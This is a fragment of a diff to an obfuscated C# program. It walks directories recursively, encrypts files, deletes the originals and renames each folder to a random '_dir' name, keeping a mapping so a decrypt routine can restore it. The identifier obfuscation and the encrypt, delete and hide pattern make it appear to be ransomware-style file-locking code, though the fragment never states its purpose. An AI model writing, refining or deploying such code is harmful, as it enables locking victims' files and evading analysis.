@@ -157,17 +157,17 @@ static class obf1_
                 obf22_.Dispose();
                 obf28_.Delete();
                 Console.WriteLine("[DECRYPTEDOUTPUT]", fpath);
+                string cName = obf20_.Name;
+                if (obf19_.ContainsKey(cName) && efile)
+                {
+                    string fPathNew = Path.Combine(obf20_.FullName.Substring(0, obf20_.FullName.Length - obf20_.Name.Length), obf19_[cName]);
+                    obf20_.MoveTo(fPathNew);
+                }
             }
             catch (Exception ex)
             {
                 Console.WriteLine("[ERRORPARAMS]", ex.Message, obf28_.FullName);
             }
-        }
-        string cName = obf20_.Name;
-        if (obf19_.ContainsKey(cName) && efile)
-        {
-            string fPathNew = Path.Combine(obf20_.FullName.Substring(0, obf20_.FullName.Length - obf20_.Name.Length), obf19_[cName]);
-            obf20_.MoveTo(fPathNew);
         }
         foreach (DirectoryInfo di in obf20_.GetDirectories())
             obf25_(di, true);
@@ -205,22 +205,22 @@ static class obf1_
                 obf22_.Dispose();
                 obf28_.Delete();
                 Console.WriteLine("[ENCRYPTEDOUTPUT]", obf28_.FullName);
-
+                if (efile)
+                {
+                    string obf33_ = obf0_(10) + "_dir";
+                    while (obf19_.ContainsKey(obf33_))
+                        obf33_ = obf0_(10) + "_dir";
+                    obf19_[obf33_] = obf20_.Name;
+                    string fPathNew = Path.Combine(obf20_.FullName.Substring(0, obf20_.FullName.Length - obf20_.Name.Length), obf33_);
+                    obf20_.MoveTo(fPathNew);
+                }
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
             }
         }
-        if (efile)
-        {
-            string obf33_ = obf0_(10) + "_dir";
-            while (obf19_.ContainsKey(obf33_))
-                obf33_ = obf0_(10) + "_dir";
-            obf19_[obf33_] = obf20_.Name;
-            string fPathNew = Path.Combine(obf20_.FullName.Substring(0, obf20_.FullName.Length - obf20_.Name.Length), obf33_);
-            obf20_.MoveTo(fPathNew);
-        }
+        
         foreach (DirectoryInfo di in obf20_.GetDirectories())
             obf26_(di, true);
     }
